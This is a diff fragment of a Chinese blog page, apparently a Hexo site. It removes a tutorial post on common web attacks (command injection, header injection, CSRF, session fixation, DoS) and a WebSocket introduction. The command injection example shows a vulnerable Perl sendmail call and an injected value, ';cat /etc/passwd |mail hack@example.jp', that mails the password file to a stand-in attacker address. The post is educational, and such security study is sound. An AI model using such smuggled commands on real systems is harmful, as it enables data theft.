-<h2 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h2><p>指通过Web应用，执行非法的操作系统命令达到攻击的目的，只要在能调用Shell函数的地方就有存在被攻击的风险。</p>
-<p>可以从Web应用中通过Shell来调用操作系统命令，倘若调用Shell时存在疏漏，就可以执行非法的OS命令。OS命令注入攻击可以向Shell发送命令，让Windows或Linux操作系统的命令行启动程序。</p>
-<p>eg:</p>
-<p>咨询表单的发送功能，将用户的咨询邮件按已填写对方的邮箱地址发送过去。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr= $q-&gt;param(&#x27;mailaddress&#x27;);</span><br><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail $adr&quot;);</span><br><span class="line">print MAIL &quot;FROM :info@example.com\n&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>程序中的open函数会调用sendmail命令发送邮件，而制定邮件发送地址是$adr，攻击者把下面的值制定为邮件地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;cat /etc/passwd |mail hack@example.jp</span><br></pre></td></tr></table></figure>
-
-<p>程序接收到该值后构成以下组合：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(MAIL,&quot;| /usr/sbin/sendmail;cat /etc/passwd | mail hack@example.jp</span><br></pre></td></tr></table></figure>
-
-<p>“;”在OS命令中会被解析为分割多个执行命令的标记，因此sendmail会将含有Linux账户信息/etc/passwd的文件以邮件形式发送给<a href="mailto:&#x68;&#x61;&#99;&#107;&#64;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#x65;&#x2e;&#106;&#112;">&#x68;&#x61;&#99;&#107;&#64;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#x65;&#x2e;&#106;&#112;</a>。</p>
-<h2 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h2><p>值攻击者通过在响应首部字段内插入换行，添加任意响应首部或主题的一种攻击，属于被动攻击模式。向首部主题内添加内容的攻击称为HTTP响应阶段攻击。</p>
-<p>HTTP首部注入攻击有可能会造成以下影响：</p>
-<ul>
-<li>设置任何Cookie信息</li>
-<li>重定向至任意URL</li>
-<li>显示任意的主体（HTTP响应阶段攻击）</li>
-</ul>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj7.png"></p>
-<p>此刻，Set-Cookie生效，攻击者可指定修改任意Cookie信息，通过和绘画固定攻击组合，攻击者可伪装成用户</p>
-<p>攻击者输入%0D%0A变成换行符，结果插入了新的首部字段。</p>
-<h2 id="HTTP响应截断攻击"><a href="#HTTP响应截断攻击" class="headerlink" title="HTTP响应截断攻击"></a>HTTP响应截断攻击</h2><p>HTTP响应截断攻击是用在HTTP首部注入的一种攻击，攻击顺序相同，但是要将两个%0D%0A%0D%0A并排插入字符串后发送，利用这两个连续的换行可作出HTTP首部和主体分割所需的空行，这样就能显示伪造的主体，达到攻击目的。</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj8.png"></p>
-<p>利这种攻击，已触发陷阱的用户浏览器会显示伪造的WEB页面，再让用户输入自己的个人信息，达到和XSS攻击相同效果</p>
-<h2 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h2><p>攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击。利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件。<br>邮件地址：<br>%0D%0A 代表一个换行符，可以实现邮件地址的追加</p>
-<p>%0D%0A%0D%0A代表两个连续的换行符，可以篡改邮件文本内容</p>
-<h2 id="目录遍历攻击："><a href="#目录遍历攻击：" class="headerlink" title="目录遍历攻击："></a>目录遍历攻击：</h2><p>对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击<br>用户可使用．…/等相对路径定位到/etc/passed等绝对路径上<br>例：</p>
-<h2 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h2><p>当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取之后，就可运行任意脚本的一种攻击。<br>例：<img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj9.png"></p>
-<h2 id="开放重定向"><a href="#开放重定向" class="headerlink" title="开放重定向"></a>开放重定向</h2><p>是指对指定的任意URL左重定向跳转功能，而与此功能先关联的安全漏洞是指，加入指定的重定向URL到某个具有恶意的Web网站，那么用户就会被诱导到那个网站，有可能被攻击者选中并作为钓鱼攻击的跳板</p>
-<h2 id="因会话管理疏忽引发漏洞"><a href="#因会话管理疏忽引发漏洞" class="headerlink" title="因会话管理疏忽引发漏洞"></a>因会话管理疏忽引发漏洞</h2><p>会话劫持：攻击者通过某种手段拿到用户的会话ID，并非法使用此会话ID伪装成用户，达到攻击目的。</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj10.png">会话</p>
-<h2 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h2><p>对以窃取目标会话ID为主动攻击手段的会话劫持，会话固定攻击会强制用户使用攻击者指定额会话ID</p>
-<p>例子：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj11.png"></p>
-<h2 id="跨站点请求伪造（CSRF）"><a href="#跨站点请求伪造（CSRF）" class="headerlink" title="跨站点请求伪造（CSRF）"></a>跨站点请求伪造（CSRF）</h2><p>是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p>
-<h3 id="可能造成的影响："><a href="#可能造成的影响：" class="headerlink" title="可能造成的影响："></a>可能造成的影响：</h3><ul>
-<li>利用已通过认证的用户权限更新设定信息等</li>
-<li>利用已通过认证的用户权限购买商品</li>
-<li>利用已通过认证的用户权限在留言板发表言论</li>
-</ul>
-<p>例子：</p>
-<p><img src="/2022/04/12/%E9%92%88%E5%AF%B9Web%E7%9A%84%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/gj12.png"></p>
-<h2 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h2><p>是一种让运行中的服务呈停止状态的攻击，有时也叫停止攻击或拒绝服务攻击，DoS攻击的对象不仅限于Web网站，还包括网络设备及服务器。</p>
-<h3 id="主要有两种DOS攻击方式："><a href="#主要有两种DOS攻击方式：" class="headerlink" title="主要有两种DOS攻击方式："></a>主要有两种DOS攻击方式：</h3><ul>
-<li>集中利用访问请求造成资源过载，资源用尽的同时，实际上服务也就呈现停止状态。</li>
-<li>通过攻击安全漏洞使服务停止</li>
-</ul>
-<p>集中利用访问请求，就是发送大量的合法请求，服务器很难分辨何为正常请求，何为攻击请求，因此很难防止DOS攻击。</p>
-<p>多台计算机发起的DOS攻击称为DDOS攻击，DDOS攻击通常利用那些感染病毒的极端及作为攻击者的攻击跳板</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/12/WebSocket/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
-      <meta itemprop="name" content="小柒">
-      <meta itemprop="description" content="欢迎来到我的世界!">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小柒">
-    </span>
-      <header class="post-header">
-
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/12/WebSocket/" class="post-title-link" itemprop="url">WebSocket</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-12 17:46:11" itemprop="dateCreated datePublished" datetime="2022-04-12T17:46:11+08:00">2022-04-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-08-25 10:06:46" itemprop="dateModified" datetime="2022-08-25T10:06:46+08:00">2022-08-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">计算机网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>初次接触 WebSocket 的人，都会问同样的问题：我们已经有了 HTTP 协议，为什么还需要另一个协议？它能带来什么好处？</p>
-<p>答案很简单，因为 HTTP 协议有一个缺陷：通信只能由客户端发起。</p>
-<p>举例来说，我们想了解今天的天气，只能是客户端向服务器发出请求，服务器返回查询结果。HTTP 协议做不到服务器主动向客户端推送信息。</p>
-<p>这种单向请求的特点，注定了如果服务器有连续的状态变化，客户端要获知就非常麻烦。我们只能使用<a target="_blank" rel="noopener" href="https://www.pubnub.com/blog/2014-12-01-http-long-polling/">“轮询”</a>：每隔一段时候，就发出一个询问，了解服务器有没有新的信息。最典型的场景就是聊天室。</p>
-<p>轮询的效率低，非常浪费资源（因为必须不停连接，或者 HTTP 连接始终打开）。因此，工程师们一直在思考，有没有更好的方法。WebSocket 就是这样发明的。</p>
-<h2 id="使用浏览器进行全双工通信的WebSocket"><a href="#使用浏览器进行全双工通信的WebSocket" class="headerlink" title="使用浏览器进行全双工通信的WebSocket"></a>使用浏览器进行全双工通信的WebSocket</h2><p>WebSocket 协议在2008年诞生，2011年成为国际标准。所有浏览器都已经支持了。</p>
-<p>它的最大特点就是，服务器可以主动向客户端推送信息，客户端也可以主动向服务器发送信息，是真正的双向平等对话，属于<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Push_technology">服务器推送技术</a>的一种。</p>
-<p>其他特点包括：</p>
-<p>（1）建立在 TCP 协议之上，服务器端的实现比较容易。</p>
-<p>（2）与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器。</p>
-<p>（3）减少通信量，只要建立起WebSocket连接，就希望一直保持连接，和http相比，不但每次连接时走开小减少。而且数据格式比较轻量，性能开销小，通信高效。</p>
-<p>（4）可以发送文本，也可以发送二进制数据。</p>
-<p>（5）没有同源限制，客户端可以与任意服务器通信。</p>
-<p>（6）协议标识符是<code>ws</code>（如果加密，则为<code>wss</code>），服务器网址就是 URL。</p>
-<blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ws://example.com:80/some/path</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2 id="握手请求"><a href="#握手请求" class="headerlink" title="握手请求"></a>握手请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Upgrade:websocket</span><br></pre></td></tr></table></figure>
-
-<p>Set-WebSocket-Key字段内记录着握手过程中必不可少的键值，Sec-WebSocket-Protocol字段内记录使用的子协议，子协议按WebSocket协议标准在连接分开使用时，定义那些连接的名称</p>
-<h2 id="握手响应"><a href="#握手响应" class="headerlink" title="握手响应"></a>握手响应</h2><p>对于之前的请求，返回状态码101 Switching Protocols的响应</p>
-<p><img src="/2022/04/12/WebSocket/image-20220412180138972-16497577748051.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1456,7 +1420,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">231</span>
+          <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1530,7 +1494,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共208.8k字</span>
+  <span class="post-count">博客全站共211.7k字</span>
 </div>
         
 
